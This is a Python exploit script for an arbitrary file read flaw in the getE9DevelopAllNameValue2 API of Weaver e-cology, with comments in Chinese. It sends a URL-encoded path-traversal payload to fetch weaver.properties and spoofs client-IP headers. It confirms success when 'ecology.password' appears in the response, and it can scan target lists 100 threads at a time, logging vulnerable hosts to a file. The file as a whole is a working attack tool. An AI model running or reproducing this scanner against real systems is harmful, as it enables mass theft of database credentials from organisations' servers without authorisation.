import requests,re,argparse,os,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    banner()

    parser = argparse.ArgumentParser(description="泛微e-cology getE9DevelopAllNameValue2接口存在任意文件读取漏洞")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
        
def poc(target):
    payload = "/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties"
    url = target+payload
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "X-Forwarded-For": "127.0.0.1",
        "X-Originating": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",

            }    
    try:
        res = requests.get(url=url,headers=header,verify=False,timeout=10)
        if  'ecology.password' in res.text and res.status_code == 200:
            print(f"[+]此url{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n') 
        else:
            print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试"+e)
if __name__ ==  '__main__':
    main()